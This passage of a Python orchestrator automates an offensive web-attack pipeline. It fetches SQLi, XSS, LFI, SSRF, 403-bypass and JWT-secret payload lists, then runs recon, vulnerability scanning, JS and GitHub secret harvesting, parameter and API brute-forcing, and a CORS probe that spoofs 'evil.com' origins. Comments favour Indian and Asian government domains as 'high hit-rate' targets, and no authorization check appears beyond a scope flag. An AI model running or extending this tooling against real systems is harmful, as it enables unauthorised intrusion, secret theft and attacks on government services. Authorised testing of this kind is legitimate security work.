        "lfi-payloads.txt":         "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt",
        "sqli-payloads.txt":        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt",
        "xss-payloads.txt":         "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt",
        "redirect-payloads.txt":    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/redirect/open-redirects-payloads.txt",
        "jwt-secrets.txt":          "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list",
        "ssrf-payloads.txt":        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SSRF/SSRF-list.txt",
        # ── Web-Fuzzing-Box (gh0stkey) — higher coverage ────────────────────
        "sqli_params.txt":          "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Sql_Injection/Sql_Params.txt",
        "sqli_payloads.txt":        "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Sql_Injection/Sql_Payload.txt",
        "xss_all.txt":              "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Xss/All.txt",
        "lfi.txt":                  "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/File_Include/Lfi.txt",
        "traversal_deep.txt":       "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Traversal_Directory/Deep_Traversal.txt",
        "traversal_exotic.txt":     "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Traversal_Directory/Traversals_8_Deep_Exotic_Encoding.txt",
        "open_redirect_params.txt": "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Open_Redirect/Url_Redirect_Params.txt",
        "bypass_403_chars.txt":     "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Api_Bypass/Bypass_Endpoint_Characters.txt",
        "bypass_403_headers.txt":   "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Vuln/Api_Bypass/Bypass_Endpoint_Headers.txt",
        # ── Wooyun historical vuln paths (high hit-rate on Asian gov/enterprise) ─
        "wooyun_dir.txt":           "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Dir/Wooyun/Dir.txt",
        "wooyun_jsp.txt":           "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Dir/Wooyun/Jsp.txt",
        "wooyun_php.txt":           "https://raw.githubusercontent.com/gh0stkey/Web-Fuzzing-Box/main/Dir/Wooyun/Php.txt",
    }
    for name, url in wordlists.items():
        filepath = os.path.join(WORDLIST_DIR, name)
        if os.path.exists(filepath) and os.path.getsize(filepath) > 100:
            log("ok", f"Wordlist exists: {name}")
            continue
        log("info", f"Downloading {name}...")
        ok, _ = run_cmd(f'curl -sL "{url}" -o "{filepath}"', timeout=60)
        if ok and os.path.exists(filepath) and os.path.getsize(filepath) > 100:
            lines = sum(1 for _ in open(filepath))
            log("ok", f"Downloaded {name} ({lines} entries)")
        else:
            log("err", f"Failed: {name}")
    log("ok", f"Wordlists ready: {WORDLIST_DIR}")


# ── Target selection ───────────────────────────────────────────────────────────
def select_targets(top_n: int = 10) -> list:
    log("info", "Running target selector...")
    script = os.path.join(SCRIPT_DIR, "targets.py")
    ok, output = run_cmd(f'python3 "{script}" --top {top_n}', timeout=60)
    print(output)
    if not ok:
        log("err", "Target selection failed")
        return []
    targets_file = os.path.join(TARGETS_DIR, "selected_targets.json")
    if os.path.exists(targets_file):
        with open(targets_file) as f:
            data = json.load(f)
        return data.get("targets", [])
    return []


# ── Core pipeline steps ────────────────────────────────────────────────────────
def run_recon(
    domain: str,
    quick: bool = False,
    batch_size: int = 10,
    resume: bool = False,
    session_id: str | None = None,
    scope_lock: bool = False,
    max_urls: int = 100,
) -> bool:
    if resume:
        active_session_id, recon_dir = _activate_recon_session(
            domain,
            requested_session_id=session_id or "latest",
            create=False,
        )
        if not recon_dir:
            log("err", f"No recon session found for {domain} to resume")
            return False
    else:
        active_session_id, recon_dir = _activate_recon_session(
            domain,
            requested_session_id=session_id,
            create=True,
        )
    resume_flag = "--resume" if resume else ""
    if resume:
        log("phase", f"RECON (RESUME): {domain} [{active_session_id or 'legacy'}] — skipping completed phases")
    else:
        log("phase", f"RECON: {domain} (batch={batch_size}) [{active_session_id}]")
    log("info", f"Recon output dir: {recon_dir}")
    script     = os.path.join(SCRIPT_DIR, "recon.sh")
    quick_flag = "--quick" if quick else ""
    adaptive_env = _shell_env_prefix(_adaptive_runtime_overrides(domain))
    os.makedirs(recon_dir, exist_ok=True)

    # Scale recon timeout based on previously resolved host count (if resuming)
    # or fall back to RECON_TIMEOUT default. Formula: 2h + 1s per resolved host,
    # capped at RECON_TIMEOUT_MAX. This prevents gov.in-class targets (29k hosts)
    # from hitting a 1h hard kill before httpx_full.txt is produced.
    _resolved_file = os.path.join(recon_dir, "subdomains", "resolved.txt")
    _prev_resolved = sum(1 for _ in open(_resolved_file) if _.strip()) if os.path.isfile(_resolved_file) else 0
    _dynamic_timeout = min(RECON_TIMEOUT + _prev_resolved, RECON_TIMEOUT_MAX)
    if _prev_resolved > 1000:
        log("info", f"Large target: {_prev_resolved} resolved hosts — recon timeout scaled to {_dynamic_timeout}s ({_dynamic_timeout//3600}h {(_dynamic_timeout%3600)//60}m)")

    if _brain and _brain.enabled:
        _brain.phase_start("RECON", f"target={domain} batch={batch_size} session={active_session_id or 'legacy'}")
    # Detect target type and pass to recon.sh
    _target_type = detect_target_type(domain)
    if _target_type in ("ip", "cidr"):
        scope_lock = True  # IPs/CIDRs never need subdomain enum
        log("info", f"Target type: {_target_type.upper()} — subdomain enum skipped")
        if _target_type == "cidr":
            _hosts = expand_cidr(domain)
            log("info", f"CIDR {domain} → {len(_hosts)} host(s) to scan")

    _scope_env  = "SCOPE_LOCK=1 " if scope_lock else ""
    _type_env   = f'TARGET_TYPE="{_target_type}" '
    _maxurl_env = f"MAX_URLS={max_urls} " if max_urls > 0 else "MAX_URLS=0 "
    if scope_lock and _target_type == "domain":
        log("info", f"Scope-lock ON — subdomain enum skipped, testing {domain} only")
    if max_urls > 0:
        log("info", f"URL cap: {max_urls} URLs max (priority-ordered)")
    ok = run_live(
        f'{adaptive_env}{_scope_env}{_type_env}{_maxurl_env}'
        f'RECON_OUT_DIR="{recon_dir}" RECON_SESSION_ID="{active_session_id or ""}" '
        f'BATCH_SIZE={batch_size} bash "{script}" "{domain}" {quick_flag} {resume_flag}',
        timeout=_dynamic_timeout,
        watch_file=recon_dir,
        watch_phase="RECON",
        watch_interval=WATCHDOG_INTERVAL,
        watch_max_stale=WATCHDOG_MAX_IDLE,
    )
    _brain_phase_complete(
        "RECON",
        ok,
        detail=f"target={domain} batch={batch_size} resume={resume} session={active_session_id or 'legacy'}",
        artifacts={"recon": recon_dir},
    )
    if ok:
        state = _update_target_state_from_artifacts(domain, session_id=active_session_id)
        propagated = _propagate_exposed_paths(domain, session_id=active_session_id)
        if propagated:
            log("warn", f"Cross-subdomain propagation surfaced {propagated} additional exposure hit(s)")
        elif state.get("waf_hosts"):
            log("info", f"Persistent state: {len(state.get('waf_hosts', []))} WAF-heavy host(s) remembered")
    return ok


def run_prioritize(domain: str) -> bool:
    log("info", f"Tech-CVE prioritization: {domain}")
    recon_dir   = _resolve_recon_dir(domain)
    httpx_file  = os.path.join(recon_dir, "live", "httpx_full.txt")
    output_file = os.path.join(recon_dir, "priority", "prioritized_hosts.txt")
    if not os.path.isfile(httpx_file):
        log("err", f"No httpx data at {httpx_file} — run recon first")
        return False
    scorer = os.path.join(SCRIPT_DIR, "prioritize.py")
    priority_dir = os.path.join(recon_dir, "priority")
    os.makedirs(priority_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("PRIORITIZE", f"target={domain}")
    ok, output = run_cmd(
        f'python3 "{scorer}" "{httpx_file}" "{output_file}"',
        timeout=120,
        watch_file=priority_dir,
        watch_phase="PRIORITIZE",
    )
    print(output)
    if ok:
        priority_json = os.path.splitext(output_file)[0] + ".json"
        buckets = _load_json(priority_json, {})
        if isinstance(buckets, dict):
            for severity in ("critical", "high", "medium", "low"):
                hosts = [
                    item.get("url", "").strip()
                    for item in buckets.get(severity, [])
                    if isinstance(item, dict) and item.get("url")
                ]
                bucket_file = os.path.join(priority_dir, f"{severity}_hosts.txt")
                with open(bucket_file, "w") as fh:
                    fh.write("\n".join(hosts) + ("\n" if hosts else ""))
        _log_best_validation_targets(recon_dir, limit=10)
    _brain_phase_complete(
        "PRIORITIZE",
        ok,
        detail=f"target={domain}",
        artifacts={"priority": priority_dir, "httpx": httpx_file},
    )
    return ok


def run_vuln_scan(domain: str, quick: bool = False, skip_items: set[str] | None = None, full: bool = False) -> bool:
    skip_items = skip_items or set()
    recon_dir = _resolve_recon_dir(domain)
    if not os.path.isdir(recon_dir):
        log("err", f"No recon data for {domain}. Run recon first.")
        return False
    priority_file = os.path.join(recon_dir, "priority", "prioritized_hosts.txt")
    if _file_nonempty(os.path.join(recon_dir, "live", "httpx_full.txt")):
        log("info", "Refreshing tech-CVE prioritization from latest recon artifacts")
        run_prioritize(domain)
    elif not os.path.isfile(priority_file):
        log("info", "Priority files missing — running tech-CVE prioritization first")
        run_prioritize(domain)
    log("phase", f"VULN SCAN: {domain}")
    if _brain and _brain.enabled:
        _brain.phase_start("VULN SCAN", f"target={domain}")
    script     = os.path.join(SCRIPT_DIR, "scanner.sh")
    quick_flag = "--quick" if quick else ""
    full_flag  = "--full" if full else ""
    scan_skip_aliases = {
        "jwt_audit": "jwt",
        "redirect": "redirects",
        "cms_exploit": "cms",
        "cve_hunt": "cves",
        "auth": "auth_bypass",
        "takeovers": "takeover",
    }
    skip_values = sorted({
        scan_skip_aliases.get(item, item) for item in skip_items
        if item in {
            "upload", "xss", "sqli", "lfi", "ssti", "ssrf", "cves", "cors", "takeover",
            "misconfig", "jwt", "graphql", "smuggling", "redirects", "idor",
            "auth_bypass", "host_header", "exposure", "cloud", "cms", "sqlmap",
            "jwt_audit", "redirect", "cms_exploit", "cve_hunt", "auth", "takeovers",
        }
    })
    skip_flag = f'--skip "{",".join(skip_values)}"' if skip_values else ""
    findings_dir = _resolve_findings_dir(domain, create=True)
    adaptive_env = _shell_env_prefix(_adaptive_runtime_overrides(domain))
    # Batching logic for large targets (e.g. gov.in with 800+ hosts)
    # This prevents the global 1-hour watchdog from killing a huge scan that is actually making progress.
    all_hosts = []
    if os.path.isfile(priority_file):
        all_hosts = [l.strip() for l in open(priority_file) if l.strip()]
    
    if len(all_hosts) > 50:
        log("info", f"Large target list ({len(all_hosts)} hosts) — splitting into batches of 50 for stability")
        batch_size = 50
        batches = [all_hosts[i:i + batch_size] for i in range(0, len(all_hosts), batch_size)]
        
        ok = True
        for i, batch in enumerate(batches):
            batch_num = i + 1
            log("info", f"VULN SCAN: Processing batch {batch_num}/{len(batches)} ({len(batch)} hosts)")
            
            # Create a temporary priority file for this batch
            batch_priority = os.path.join(recon_dir, "priority", f"prioritized_hosts_batch_{batch_num}.txt")
            with open(batch_priority, "w") as fh:
                fh.write("\n".join(batch) + "\n")
            
            # Point the scanner to the batch file via environment override if needed, 
            # but scanner.sh usually reads $RECON_DIR/priority/prioritized_hosts.txt.
            # We temporarily swap it.
            original_priority = priority_file
            backup_priority = priority_file + ".bak"
            if os.path.exists(original_priority):
                shutil.copy2(original_priority, backup_priority)
            
            shutil.copy2(batch_priority, original_priority)
            
            try:
                batch_ok = run_live(
                    f'{adaptive_env}FINDINGS_OUT_DIR="{findings_dir}" bash "{script}" "{recon_dir}" {quick_flag} {full_flag} {skip_flag}',
                    timeout=SCAN_TIMEOUT,
                    watch_file=findings_dir,
                    watch_phase=f"VULN SCAN (Batch {batch_num}/{len(batches)})",
                    watch_interval=WATCHDOG_INTERVAL,
                    watch_max_stale=WATCHDOG_MAX_IDLE,
                )
                ok = ok and batch_ok
            finally:
                # Restore original
                if os.path.exists(backup_priority):
                    shutil.move(backup_priority, original_priority)
            
            # Break if we hit a critical failure or user interrupt (handled by run_live)
            if not ok and batch_num < len(batches):
                log("warn", f"Batch {batch_num} failed or interrupted — continuing to next batch")
    else:
        ok = run_live(
            f'{adaptive_env}FINDINGS_OUT_DIR="{findings_dir}" bash "{script}" "{recon_dir}" {quick_flag} {full_flag} {skip_flag}',
            timeout=SCAN_TIMEOUT,
            watch_file=findings_dir,
            watch_phase="VULN SCAN",
            watch_interval=WATCHDOG_INTERVAL,
            watch_max_stale=WATCHDOG_MAX_IDLE,
        )
    _brain_phase_complete(
        "VULN SCAN",
        ok,
        detail=f"target={domain} quick={quick} full={full} skip={','.join(skip_values) or 'none'}",
        artifacts={"findings": findings_dir, "upload": os.path.join(findings_dir, "upload")},
    )
    if ok:
        _update_target_state_from_artifacts(domain, session_id=_runtime_session_id(domain) or _active_recon_session_id(domain))
        propagated = _propagate_exposed_paths(domain, session_id=_runtime_session_id(domain) or _active_recon_session_id(domain))
        if propagated:
            log("warn", f"Cross-subdomain propagation surfaced {propagated} additional exposure hit(s)")
    return ok


# ── NEW: JS Analysis ───────────────────────────────────────────────────────────
def run_js_analysis(domain: str) -> bool:
    """
    Phase: JS Analysis
    1. Collect JS URLs from katana output / urls.txt
    2. jsluice  → extract endpoints, secrets, URLs from each JS file
    3. SecretFinder → regex-based secret extraction
    4. trufflehog → entropy-based secrets from crawled JS
    """
    log("phase", f"JS ANALYSIS: {domain}")
    recon_dir = _resolve_recon_dir(domain)
    js_dir    = os.path.join(recon_dir, "js")
    os.makedirs(js_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("JS ANALYSIS", f"target={domain}")

    urls_file = os.path.join(recon_dir, "live", "urls.txt")
    if not os.path.isfile(urls_file):
        log("warn", f"No urls.txt for {domain} — run recon first")
        _brain_phase_complete("JS ANALYSIS", False, detail=f"target={domain} missing urls.txt")
        return False

    # ── Extract JS URLs ──
    js_urls_file = os.path.join(js_dir, "js_urls.txt")
    run_cmd(
        f'grep -iE "\\.js(\\?|$)" "{urls_file}" | sort -u > "{js_urls_file}"',
        timeout=30
    )
    if not os.path.isfile(js_urls_file) or os.path.getsize(js_urls_file) == 0:
        log("warn", "No JS files found in URLs")
        _brain_phase_complete("JS ANALYSIS", False, detail=f"target={domain} no JS URLs found")
        return False

    js_count = sum(1 for _ in open(js_urls_file))
    log("info", f"Found {js_count} JS files — analyzing...")

    jsluice_bin  = _tool_bin("jsluice")
    secretfinder = _tool_bin("secretfinder")
    trufflehog   = _tool_bin("trufflehog")

    # ── jsluice: endpoints + secrets ──
    if _which(jsluice_bin):
        jsluice_out = os.path.join(js_dir, "jsluice_secrets.txt")
        endpoints_out = os.path.join(js_dir, "jsluice_endpoints.txt")
        cmd = (
            f'cat "{js_urls_file}" | while read url; do '
            f'  curl -sk "$url" | {jsluice_bin} secrets --input-format=js 2>/dev/null; '
            f'done | tee "{jsluice_out}"'
        )
        run_cmd(cmd, timeout=JS_SCAN_TIMEOUT, watch_file=js_dir, watch_phase="JS ANALYSIS")
        cmd2 = (
            f'cat "{js_urls_file}" | while read url; do '
            f'  curl -sk "$url" | {jsluice_bin} urls --input-format=js 2>/dev/null; '
            f'done | sort -u | tee "{endpoints_out}"'
        )
        run_cmd(cmd2, timeout=JS_SCAN_TIMEOUT, watch_file=js_dir, watch_phase="JS ANALYSIS")
        if os.path.exists(jsluice_out):
            count = sum(1 for _ in open(jsluice_out) if _.strip())
            log("ok", f"jsluice: {count} secrets found → {jsluice_out}")
    else:
        log("warn", "jsluice not found — skipping")

    # ── SecretFinder ──
    if os.path.isfile(secretfinder):
        sf_out = os.path.join(js_dir, "secretfinder.txt")
        cmd = (
            f'cat "{js_urls_file}" | while read url; do '
            f'  python3 "{secretfinder}" -i "$url" -o cli 2>/dev/null; '
            f'done | tee "{sf_out}"'
        )
        run_cmd(cmd, timeout=JS_SCAN_TIMEOUT, watch_file=js_dir, watch_phase="JS ANALYSIS")
        if os.path.exists(sf_out):
            count = sum(1 for _ in open(sf_out) if _.strip())
            log("ok", f"SecretFinder: {count} hits → {sf_out}")
    else:
        log("warn", "SecretFinder not found at ~/tools/SecretFinder/")

    # ── trufflehog: scan fetched JS content ──
    if _which(trufflehog):
        tf_out = os.path.join(js_dir, "trufflehog.json")
        # Download JS files to a temp dir and scan
        dl_dir = os.path.join(js_dir, "downloaded")
        os.makedirs(dl_dir, exist_ok=True)
        run_cmd(
            f'cat "{js_urls_file}" | head -50 | while read url; do '
            f'  name=$(echo "$url" | md5sum | cut -d" " -f1).js; '
            f'  curl -sk "$url" -o "{dl_dir}/$name" 2>/dev/null; '
            f'done',
            timeout=300,
            watch_file=dl_dir,
            watch_phase="JS ANALYSIS"
        )
        ok, output = run_cmd(
            f'{trufflehog} filesystem "{dl_dir}" --json --no-update 2>/dev/null | tee "{tf_out}"',
            timeout=SECRET_TIMEOUT,
            watch_file=js_dir,
            watch_phase="JS ANALYSIS"
        )
        if os.path.exists(tf_out):
            hits = sum(1 for _ in open(tf_out) if _.strip())
            log("ok", f"TruffleHog: {hits} secrets → {tf_out}")
    else:
        log("warn", "trufflehog not found")

    _brain_phase_complete(
        "JS ANALYSIS",
        True,
        detail=f"target={domain} js_urls={js_count}",
        artifacts={"js": js_dir},
    )
    return True


# ── NEW: Secret Hunt ───────────────────────────────────────────────────────────
def run_secret_hunt(domain: str) -> bool:
    """
    TruffleHog on recon artifacts + GitHound on GitHub for the domain.
    """
    log("phase", f"SECRET HUNT: {domain}")
    recon_dir  = _resolve_recon_dir(domain)
    secret_dir = os.path.join(recon_dir, "secrets")
    os.makedirs(secret_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("SECRET HUNT", f"target={domain}")

    trufflehog = _tool_bin("trufflehog")
    git_hound  = _tool_bin("git-hound")

    # TruffleHog on full recon dir
    if _which(trufflehog):
        tf_out = os.path.join(secret_dir, "trufflehog_recon.json")
        ok, out = run_cmd(
            f'{trufflehog} filesystem "{recon_dir}" --json --no-update 2>/dev/null | tee "{tf_out}"',
            timeout=SECRET_TIMEOUT,
            watch_file=secret_dir,
            watch_phase="SECRET HUNT"
        )
        if os.path.exists(tf_out):
            hits = sum(1 for _ in open(tf_out) if _.strip())
            log("ok" if hits == 0 else "crit", f"TruffleHog recon scan: {hits} secrets → {tf_out}")
    else:
        log("warn", "trufflehog not in PATH")

    # GitHound: search GitHub for secrets related to domain
    if _which(git_hound):
        gh_out = os.path.join(secret_dir, "githound.txt")
        ok, out = run_cmd(
            f'echo "{domain}" | {git_hound} --dig-files --dig-commits 2>/dev/null | tee "{gh_out}"',
            timeout=SECRET_TIMEOUT,
            watch_file=secret_dir,
            watch_phase="SECRET HUNT"
        )
        if os.path.exists(gh_out):
            # Filter out GitHound's own [!] warning/error lines (e.g. "config.yml not found")
            # so only actual match lines are counted as findings
            count = sum(1 for line in open(gh_out)
                        if line.strip() and not line.lstrip().startswith("[!]"))
            log("ok" if count == 0 else "crit", f"GitHound: {count} results → {gh_out}")
    else:
        log("warn", "git-hound not in PATH — skipping GitHub scan")

    _brain_phase_complete(
        "SECRET HUNT",
        True,
        detail=f"target={domain}",
        artifacts={"secrets": secret_dir},
    )
    return True


# ── NEW: Parameter Discovery ───────────────────────────────────────────────────
def run_param_discovery(domain: str) -> bool:
    """
    Arjun (GET/POST param discovery) + ParamSpider (historic URLs with params)
    on all live hosts.
    """
    log("phase", f"PARAM DISCOVERY: {domain}")
    recon_dir  = _resolve_recon_dir(domain)
    param_dir  = os.path.join(recon_dir, "params")
    os.makedirs(param_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("PARAM DISCOVERY", f"target={domain}")

    live_file = os.path.join(recon_dir, "live", "urls.txt")
    with_params_file = os.path.join(recon_dir, "urls", "with_params.txt")
    if not os.path.isfile(live_file) and not os.path.isfile(with_params_file):
        log("warn", "No live urls.txt or urls/with_params.txt — run recon first")
        _brain_phase_complete("PARAM DISCOVERY", False, detail=f"target={domain} missing URL sources")
        return False

    # ParamSpider: historic URLs with parameters from Wayback
    if _which("paramspider"):
        ps_out_base = os.path.join(param_dir, "paramspider")
        ok, out = run_cmd(
            f'paramspider -d "{domain}" -o "{ps_out_base}" 2>/dev/null',
            timeout=PARAM_TIMEOUT,
            watch_file=param_dir,
            watch_phase="PARAM DISCOVERY"
        )
        # ParamSpider 2.x appends .txt automatically to the output path
        result_file = f"{ps_out_base}.txt"
        if not os.path.exists(result_file) and os.path.exists(ps_out_base):
            # Fallback for versions that don't append .txt
            shutil.move(ps_out_base, result_file)
        
        if os.path.exists(result_file):
            count = sum(1 for _ in open(result_file) if _.strip())
            log("ok", f"ParamSpider: {count} parameterized URLs → {result_file}")
        else:
            log("warn", f"ParamSpider output not found at {result_file}")
    else:
        log("warn", "paramspider not in PATH")

    # Arjun: find hidden GET/POST parameters on top live URLs
    if _which("arjun"):
        top_urls_file = os.path.join(param_dir, "top_urls.txt")
        arjun_inputs = _collect_urls_from_file(live_file, limit=20)
        if len(arjun_inputs) < 20:
            for url in _collect_urls_from_file(with_params_file, strip_query=True, limit=40):
                if url not in arjun_inputs:
                    arjun_inputs.append(url)
                if len(arjun_inputs) >= 20:
                    break

        if arjun_inputs:
            with open(top_urls_file, "w") as fh:
                fh.write("\n".join(arjun_inputs) + "\n")
            arjun_out = os.path.join(param_dir, "arjun.json")
            ok, out = run_cmd(
                f'arjun -i "{top_urls_file}" -oJ "{arjun_out}" --stable 2>/dev/null',
                timeout=PARAM_TIMEOUT,
                watch_file=param_dir,
                watch_phase="PARAM DISCOVERY"
            )
            if os.path.exists(arjun_out):
                try:
                    data = json.load(open(arjun_out))
                    total = sum(len(v.get("params", [])) for v in data.values())
                    log("ok", f"Arjun: {total} hidden params found → {arjun_out}")
                except Exception:
                    log("ok", f"Arjun complete → {arjun_out}")
        else:
            log("warn", "Arjun skipped — no candidate URLs available")
    else:
        log("warn", "arjun not in PATH")

    _brain_phase_complete(
        "PARAM DISCOVERY",
        True,
        detail=f"target={domain}",
        artifacts={"params": param_dir},
    )
    return True


# ── NEW: API Fuzzing ───────────────────────────────────────────────────────────
def run_api_fuzz(domain: str) -> bool:
    """
    Kiterunner: brute-force API routes using OpenAPI/Swagger wordlists.
    Feroxbuster: recursive directory/endpoint discovery on live hosts.
    """
    log("phase", f"API FUZZ: {domain}")
    recon_dir = _resolve_recon_dir(domain)
    api_dir   = os.path.join(recon_dir, "api")
    os.makedirs(api_dir, exist_ok=True)
    api_specs_dir = os.path.join(recon_dir, "api_specs")
    if _brain and _brain.enabled:
        _brain.phase_start("API FUZZ", f"target={domain}")

    live_file = os.path.join(recon_dir, "live", "httpx_full.txt")
    if not os.path.isfile(live_file):
        log("warn", "No httpx_full.txt — run recon first")
        _brain_phase_complete("API FUZZ", False, detail=f"target={domain} missing httpx_full.txt")
        return False

    kiterunner = _tool_bin("kiterunner")
    feroxbuster = _tool_bin("feroxbuster")
    api_audit = os.path.join(SCRIPT_DIR, "api_audit.py")

    # Autoswagger-style schema discovery + low-noise unauth API audit
    if os.path.isfile(api_audit):
        log("info", "OpenAPI audit: discovering specs and probing public GET operations...")
        ok, out = run_cmd(
            f'python3 "{api_audit}" --recon-dir "{recon_dir}" --max-hosts 30 --max-ops 120',
            timeout=API_FUZZ_TIMEOUT,
            watch_file=api_specs_dir,
            watch_phase="API FUZZ"
        )
        if out.strip():
            print(out.strip())
        spec_urls = os.path.join(recon_dir, "api_specs", "spec_urls.txt")
        unauth_hits = os.path.join(recon_dir, "api_specs", "unauth_api_findings.txt")
        if os.path.exists(spec_urls):
            log("ok", f"OpenAPI specs: {sum(1 for _ in open(spec_urls) if _.strip())} → {spec_urls}")
        if os.path.exists(unauth_hits):
            hits = sum(1 for _ in open(unauth_hits) if _.strip())
            level = "crit" if hits else "ok"
            log(level, f"OpenAPI unauth API findings: {hits} → {unauth_hits}")
    else:
        log("warn", "api_audit.py not found — skipping schema-derived API audit")

    # Kiterunner API route brute-force
    if _which(kiterunner):
        kr_out = os.path.join(api_dir, "kiterunner.txt")
        # Use built-in routes wordlist
        ok, out = run_cmd(
            f'{kiterunner} scan "https://{domain}" --output "{kr_out}" '
            f'--kite-file routes-large.kite 2>/dev/null || '
            f'{kiterunner} brute "https://{domain}" -w routes-large.kite -o "{kr_out}" 2>/dev/null',
            timeout=API_FUZZ_TIMEOUT,
            watch_file=api_dir,
            watch_phase="API FUZZ"
        )
        if os.path.exists(kr_out):
            count = sum(1 for _ in open(kr_out) if _.strip())
            log("ok", f"Kiterunner: {count} API routes found → {kr_out}")
        else:
            log("warn", f"Kiterunner no output (routes file may need download)")
    else:
        log("warn", "kiterunner not in PATH")

    # Feroxbuster: recursive dir brute on primary domain
    if _which(feroxbuster):
        fb_out     = os.path.join(api_dir, "feroxbuster.json")
        wordlist   = os.path.join(WORDLIST_DIR, "api-endpoints.txt")
        if not os.path.isfile(wordlist):
            wordlist = os.path.join(WORDLIST_DIR, "common.txt")

        # For .gov.in / .gov / Asian government/enterprise targets,
        # append Wooyun historical vuln paths (JSP/PHP heavy, high hit-rate)
        extra_wl = ""
        tld = domain.split(".")[-1]
        sld = ".".join(domain.split(".")[-2:])
        if tld in ("in", "cn", "jp", "kr") or sld in ("gov.in", "nic.in", "gov.cn"):
            wooyun_dir = os.path.join(WORDLIST_DIR, "wooyun_dir.txt")
            wooyun_jsp = os.path.join(WORDLIST_DIR, "wooyun_jsp.txt")
            if os.path.isfile(wooyun_dir):
                # Merge Wooyun into a combined wordlist for this run
                merged = os.path.join(api_dir, "wordlist_merged.txt")
                run_cmd(
                    f'cat "{wordlist}" "{wooyun_dir}" "{wooyun_jsp}" 2>/dev/null '
                    f'| sort -u > "{merged}"',
                    timeout=15
                )
                if os.path.isfile(merged):
                    wordlist = merged
                    log("info", f"Feroxbuster: using Wooyun+standard wordlist for {tld} target")

        ok, out = run_cmd(
            f'{feroxbuster} -u "https://{domain}" -w "{wordlist}" '
            f'-o "{fb_out}" --json --silent --auto-tune -k '
            f'--filter-status 404,301,302 2>/dev/null',
            timeout=API_FUZZ_TIMEOUT,
            watch_file=api_dir,
            watch_phase="API FUZZ"
        )
        if os.path.exists(fb_out):
            hits = sum(1 for line in open(fb_out) if '"status"' in line and '"404"' not in line)
            log("ok", f"Feroxbuster: {hits} endpoints → {fb_out}")
    else:
        log("warn", "feroxbuster not in PATH")

    _brain_phase_complete(
        "API FUZZ",
        True,
        detail=f"target={domain}",
        artifacts={"api": api_dir, "api_specs": api_specs_dir},
    )
    return True


# ── NEW: CORS Check ────────────────────────────────────────────────────────────
def run_cors_check(domain: str) -> bool:
    """
    Test CORS misconfigurations on all live hosts:
    - Reflects arbitrary Origin with Access-Control-Allow-Credentials: true
    - Null origin
    - Subdomain origin
    """
    log("phase", f"CORS CHECK: {domain}")
    recon_dir = _resolve_recon_dir(domain)
    cors_dir  = os.path.join(recon_dir, "cors")
    os.makedirs(cors_dir, exist_ok=True)
    if _brain and _brain.enabled:
        _brain.phase_start("CORS CHECK", f"target={domain}")

    live_file = os.path.join(recon_dir, "live", "urls.txt")
    if not os.path.isfile(live_file):
        log("warn", "No urls.txt — run recon first")
        _brain_phase_complete("CORS CHECK", False, detail=f"target={domain} missing urls.txt")
        return False

    cors_out = os.path.join(cors_dir, "cors_findings.txt")
    # Test each live URL for CORS misconfig
    cors_script = f"""
import subprocess, sys, urllib.request
urls = open("{live_file}").read().splitlines()[:100]
findings = []
target_domain = "{domain}"
origins = [
    "https://evil.com",
    "null",
    f"https://evil.{{target_domain}}",
    f"https://{{target_domain}}.evil.com",
]
for url in urls:
    for origin in origins:
        try:
            req = urllib.request.Request(url,
                headers={{"Origin": origin, "User-Agent": "Mozilla/5.0"}})
            resp = urllib.request.urlopen(req, timeout=5)
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == origin or acao == "*":
                line = f"CORS | {{url}} | Origin: {{origin}} → ACAO: {{acao}} | Creds: {{acac}}"
                findings.append(line)
                print(line, flush=True)
        except Exception:
            pass
with open("{cors_out}", "w") as f:
    f.write("\\n".join(findings))
print(f"[CORS] {{len(findings)}} findings saved to {cors_out}")
"""
    cors_script_path = os.path.join(cors_dir, "_cors_test.py")
    with open(cors_script_path, "w") as f:
        f.write(cors_script)

    ok, out = run_cmd(
        f'python3 "{cors_script_path}"',
        timeout=CORS_TIMEOUT,
        watch_file=cors_dir,
        watch_phase="CORS CHECK",
    )
    print(out.strip())

    if os.path.exists(cors_out):
        count = sum(1 for _ in open(cors_out) if _.strip())
        if count:
            log("crit", f"CORS: {count} vulnerabilities → {cors_out}")
        else:
            log("ok", "CORS: No misconfigurations found")
    _brain_phase_complete(
        "CORS CHECK",
        ok,
        detail=f"target={domain}",
        artifacts={"cors": cors_dir},
    )
    return True


# ── NEW: Semgrep static analysis ───────────────────────────────────────────────
def run_semgrep(source_dir: str, domain: str = "unknown") -> bool:
    """
    Run Semgrep security ruleset on a source code directory.
    """
    log("phase", f"SEMGREP: {source_dir}")
    if not os.path.isdir(source_dir):
        log("err", f"Source directory not found: {source_dir}")
        return False

    if not _which("semgrep"):
        log("warn", "semgrep not installed — pip3 install semgrep")
        return False

    out_dir = os.path.join(_resolve_findings_dir(domain, create=True), "semgrep")
    os.makedirs(out_dir, exist_ok=True)
    json_out = os.path.join(out_dir, "semgrep_results.json")
    txt_out  = os.path.join(out_dir, "semgrep_summary.txt")
    if _brain and _brain.enabled:
        _brain.phase_start("SEMGREP", f"target={domain} source={source_dir}")

